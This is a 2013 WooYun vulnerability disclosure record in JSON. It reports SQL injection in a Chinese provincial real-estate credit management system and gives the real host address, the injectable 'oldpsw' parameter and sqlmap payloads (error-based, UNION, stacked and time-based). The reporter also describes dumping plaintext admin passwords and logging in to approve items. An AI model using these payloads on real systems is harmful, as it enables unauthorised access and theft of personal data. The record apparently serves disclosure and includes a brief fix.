{"id": 61928, "wybug_id": "wooyun-2013-037445", "wybug_title": "某省房地产某业务系统sql注入漏洞(导致任意资质审核、资本金审核、资质变更与投诉处理)", "wybug_corp": "某省房地产管理局", "wybug_author": "霍大然", "wybug_date": "2013-09-18 11:33", "wybug_open_date": "2013-11-02 11:33", "wybug_type": "", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射", "后台管理", "资质审批"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-02：\t细节向公众公开  简要描述： 某省房地产行业信用管理系统sql注入漏洞(可资质审核、资本金审核、资质变更与投诉处理)，大量管理员及从业人员信息泄露，各种弱口令，各种明文密码。 详细说明：  湖南省房地产行业信用管理系统网站地址：http://113.247.238.148:4000/kfqy/\n\n注入点：http://113.247.238.148:4000/kfqy/admin/save_psw.jsp?oldpsw=1---Place: GETParameter: oldpsw    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: oldpsw=1' AND 9603=CONVERT(INT,(SELECT CHAR(113)+CHAR(109)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (9603=9603) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(116)+CHAR(113)+CHAR(113))) AND 'YogB'='YogB    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: oldpsw=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(109)+CHAR(107)+CHAR(118)+CHAR(113)+CHAR(118)+CHAR(114)+CHAR(108)+CHAR(120)+CHAR(100)+CHAR(101)+CHAR(70)+CHAR(120)+CHAR(101)+CHAR(89)+CHAR(113)+CHAR(107)+CHAR(116)+CHAR(113)+CHAR(113),NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: oldpsw=1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: oldpsw=1' WAITFOR DELAY '0:0:5'-----web application technology: JSPback-end DBMS: Microsoft SQL Server 2008\n\n拿到管理员表，明文及各种弱口令：\n\n   漏洞证明：  其他业务数据表：\n\n登录某管理员帐户，可以审核项目了：\n\n看到这些投诉引起哥的正义感，终于可以处理他们了：\n\n部分用户信息：\n\n   修复方案：  1、对参数oldpsw过滤；2、手头宽裕的话买个waf吧，现在很多厂商都不补洞，一个waf解决   版权声明：转载请注明来源 霍大然@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2013-09-22 23:09 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}